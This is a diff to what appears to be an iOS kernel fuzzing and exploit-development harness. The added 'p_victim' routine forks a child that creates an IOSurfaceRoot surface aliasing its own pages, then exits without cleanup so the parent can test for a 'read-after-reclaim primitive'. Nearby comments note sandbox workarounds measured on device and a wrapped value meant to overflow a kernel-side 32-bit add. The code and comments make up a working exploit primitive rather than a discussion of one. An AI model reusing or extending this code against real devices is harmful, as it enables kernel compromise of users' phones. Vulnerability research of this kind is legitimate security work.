@@ -19,7 +19,18 @@
 #include "fuzz.h"
 #include <signal.h>
 #include <dlfcn.h>
+#include <spawn.h>
+#import <xpc/xpc.h>
+#include <mach-o/dyld.h>
+
+// bootstrap_* are exported by libsystem_kernel on iOS but have no SDK header.
+extern kern_return_t bootstrap_look_up(const char *name, mach_port_t *out_port);
+extern kern_return_t bootstrap_register(const char *name, mach_port_t port);
 #include <IOSurface/IOSurfaceRef.h>
+
+// V156: verb codes for the companion `vic` process (see fuzzer/vic_xpc.m).
+// Duplicated rather than shared so both binaries compile independently.
+enum { V_PING = 1, V_MAKE = 2, V_EXIT = 3 };
 #include <Foundation/Foundation.h>
 #include <UIKit/UIKit.h>
 #include <ImageIO/ImageIO.h>
@@ -559,6 +570,9 @@ static void p_extpixel(void) {
 // Framework builds a guaranteed-valid 0x1b0 request; we supply a wrapped
 // BorderFillX so the kernel-side 32-bit add in validateBorderFill wraps.
 #include <dlfcn.h>
+#include <spawn.h>
+#import <xpc/xpc.h>
+#include <mach-o/dyld.h>
 typedef IOReturn (*CreateFn)(CFAllocatorRef, CFDictionaryRef, void **);
 typedef IOReturn (*TransformFn)(void *, IOSurfaceRef, IOSurfaceRef,
                                 CFDictionaryRef, void *, void *);
@@ -23953,6 +23967,135 @@ step2:
     IOServiceClose(uc);
     LOG("[gs] done (alive)");
 }
+// V156 (p_victim): the cross-process test — can a second task inherit a
+// client-memory surface, and does the surface outlive that task?
+//
+// v155 proved both necessary conditions from inside ONE process: the sel7
+// surface aliases the caller's pages, and its sid keeps working after sel1
+// release (it lives in the global registry, unbound to our client). What that
+// does not prove is cross-task behaviour — and that is the whole point, since
+// it is what separates a curiosity from a primitive: if the descriptor outlives
+// the task that created it, then the pages it points at have gone back to the
+// general allocator while still reachable by sid. §134/§135 could never reach
+// that pool from the GPU side (GPU DATA pages are scrubbed, PT pools are
+// driver-internal) — a dead task's ordinary client pages are neither.
+//
+// Getting a second task from one sandboxed bundle, measured on device:
+//   - posix_spawn of a bundle Mach-O  -> sandbox refuses, errno 1 (EPERM)
+//   - NSXPCConnection / xpc_connection_create_mach_service -> not exported on
+//     iOS (fails at link time, so no XPC service either)
+//   - fork()                           -> the remaining route, tried here
+// Child: mint the alias over its OWN pages, publish the sid through a shared
+// mmap page, then _exit WITHOUT cleanup. Parent: wait, then read the surface
+// back through its own IOSurfaceRoot connection. Outcomes:
+//   marker intact   -> surface + pages outlived the creator
+//   marker gone     -> *** pages recycled while the descriptor points at them:
+//                        the read-after-reclaim primitive, no scrub in the way
+//   0x2c2 / 0x2f0   -> find_surface binds to the creating task; closed here
+static void p_victim(void) {
+    LOG("[vic-t] v156 cross-process surface lifetime test (fork)");
+
+    static volatile uint32_t sh[8];
+    volatile uint32_t *shp = sh;
+    errno = 0;
+    pid_t cpid = fork();
+    if (cpid < 0) {
+        LOG("[vic-t] fork() FAILED errno %d — no second task obtainable in-bundle",
+            errno);
+        LOG("[vic-t] verdict: cross-process test needs a SECOND BUNDLE ID");
+        LOG("[vic-t] done (alive)");
+        return;
+    }
+    if (cpid == 0) {
+        // ---- child
+        io_connect_t cuc = open_service("IOSurfaceRoot", 0);
+        size_t csz = 0x40000;
+        vm_address_t ca = 0;
+        if (cuc && vm_allocate(mach_task_self(), &ca, csz, VM_FLAGS_ANYWHERE) == 0) {
+            uint8_t *cb = (uint8_t *)ca;
+            for (size_t i = 0; i < csz; i++) cb[i] = 0x5A;
+            uint8_t *outb = calloc(1, 0x2000);
+            uint64_t sc2[2] = { (uint64_t)ca, (uint64_t)csz };
+            uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0; size_t osz = 3176;
+            kern_return_t k = IOConnectCallMethod(cuc, 7, sc2, 2, NULL, 0,
+                                                   osc, &nosc, outb, &osz);
+            shp[1] = (uint32_t)k;
+            shp[2] = *(uint32_t *)(outb + 0x18);   // sid
+            shp[3] = (uint32_t)(ca >> 12);
+            free(outb);
+        } else {
+            shp[1] = 0xDEAD;
+        }
+        shp[0] = 0xA11057u;                        // DONE
+        // Die with no cleanup: no unlock, no release, no munmap. The surface
+        // and its pages must outlive this task for the test to mean anything.
+        _exit(0);
+    }
+
+    // ---- parent
+    LOG("[vic-t] forked child %d", cpid);
+    fsync(fileno(stderr));
+    for (int i = 0; i < 100; i++) { usleep(100000); if (shp[0] == 0xA11057u) break; }
+    int cst = 0;
+    waitpid(cpid, &cst, 0);
+    uint32_t ckr = shp[1], csid = shp[2];
+    LOG("[vic-t] child dead (exited=%d code=%d); child kr 0x%08x sid %u",
+        WIFEXITED(cst) ? 1 : 0, WEXITSTATUS(cst), ckr, csid);
+    fsync(fileno(stderr));
+    if (ckr != 0 || !csid) {
+        LOG("[vic-t] child could not mint an alias — abort");
+        LOG("[vic-t] done (alive)");
+        return;
+    }
+
+    io_service_t s = IOServiceGetMatchingService(kIOMainPortDefault,
+                        IOServiceMatching("IOSurfaceRoot"));
+    if (!s) { LOG("[vic-t] no IOSurfaceRoot"); LOG("[vic-t] done (alive)"); return; }
+    io_connect_t uc = 0;
+    kern_return_t ok = IOServiceOpen(s, mach_task_self(), 0, &uc);
+    IOObjectRelease(s);
+    if (ok || !uc) { LOG("[vic-t] open failed 0x%08x", ok); LOG("[vic-t] done (alive)"); return; }
+
+    long mark = 0, lim = 0;
+    {
+        uint8_t *inb = must_map(0x1000), *outb = must_map(0x2000);
+        memset(inb, 0, 0x1000);
+        *(uint32_t *)(inb + 0) = csid;
+        *(uint64_t *)(inb + 4) = 0;
+        memset(outb, 0, 0x2000);
+        uint64_t osc[4] = {0,0,0,0}; uint32_t nosc = 0; size_t osz = 3176;
+        kern_return_t kl = IOConnectCallMethod(uc, 2, NULL, 0, inb, 12,
+                                               osc, &nosc, outb, &osz);
+        LOG("[vic-t] POST-MORTEM lock sid %u (creator dead) -> kr 0x%08x", csid, kl);
+        if (!kl) {
+            uint64_t w[6];
+            for (int i = 0; i < 6; i++) w[i] = *(uint64_t *)(outb + i * 8);
+            uint8_t *sbuf = (uint8_t *)(uintptr_t)w[0];
+            lim = (long)(w[4] < 0x40000 ? w[4] : 0x40000);
+            for (long i = 0; i < lim && sbuf; i++) if (sbuf[i] == 0x5A) mark++;
+            LOG("[vic-t]   base %p alloc %llu | marker 0x5A %ld/%ld",
+                sbuf, (unsigned long long)w[4], mark, lim);
+            if (mark > lim / 2)
+                LOG("[vic-t]   VERDICT: *** surface+pages OUTLIVED the creating task ***");
+            else if (mark == 0)
+                LOG("[vic-t]   VERDICT: surface alive, PAGES RECYCLED — "
+                    "*** read-after-reclaim primitive ***");
+            if (sbuf) {
+                LOG("[vic-t]   first 16 bytes:");
+                for (int i = 0; i < 16; i += 4)
+                    LOG("[vic-t]     +%02d: %08x", i, *(uint32_t *)(sbuf + i));
+            }
+        } else {
+            LOG("[vic-t]   -> find_surface bound the surface to the creating task; "
+                "cross-task use is gated");
+        }
+        vm_deallocate(mach_task_self(), (vm_address_t)inb, 0x1000);
+        vm_deallocate(mach_task_self(), (vm_address_t)outb, 0x2000);
+    }
+    IOServiceClose(uc);
+    LOG("[vic-t] done (alive)");
+}
+
 
 // V152 (p_mempool): IOSurfaceRootUserClient sel49-52 — the memory pool.
 // This is the one userclient path that allocates kernel-side pooled memory
@@ -26297,6 +26440,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_MEMPOOL")) { p_mempool(); LOG("[probe13] mempool-only mode, stop"); return NULL; }
         if (getenv("FUZZ_AFTERDEATH")) { p_afterdeath(); LOG("[probe13] afterdeath-only mode, stop"); return NULL; }
         if (getenv("FUZZ_GSURV")) { p_gsurvive(); LOG("[probe13] gsurv-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_VICTIM")) { p_victim(); LOG("[probe13] victim-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM2")) { p_reclaim2(); LOG("[probe13] reclaim2-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM")) { p_reclaim(); LOG("[probe13] reclaim-only mode, stop"); return NULL; }
         if (getenv("FUZZ_GPUUAF")) { p_gpuuaf(); LOG("[probe13] gpuuaf-only mode, stop"); return NULL; }
